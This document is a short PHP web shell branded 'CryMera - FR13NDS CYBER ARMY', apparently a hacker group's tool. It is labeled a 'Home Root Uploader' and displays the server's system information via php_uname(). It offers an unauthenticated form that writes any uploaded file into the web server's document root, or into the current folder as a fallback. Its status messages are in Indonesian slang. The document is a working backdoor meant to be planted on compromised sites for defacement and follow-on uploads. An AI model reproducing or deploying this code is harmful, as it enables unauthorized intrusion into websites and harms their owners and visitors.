<title>./CryMera - FR13NDS CYBER ARMY </title><center>
<body bgcolor="black">
    <br><br><br><br>
    <br>
    <font color="lime" size="5">> ./CryMera <</font>
<font color="red"></center><br><br>
    <center>
<?php
echo "FR13NDS CYBER ARMY - Home Root Uploader<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='idx_file'>
      <input type='submit' name='upload' value='Upload'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Sukses Cok! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "Gagal Upload Di Document Root.";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "Sukses Upload <b>$files</b> Di Folder Ini";
        } else {
            echo "Gagal!";
        }
    }
}
?>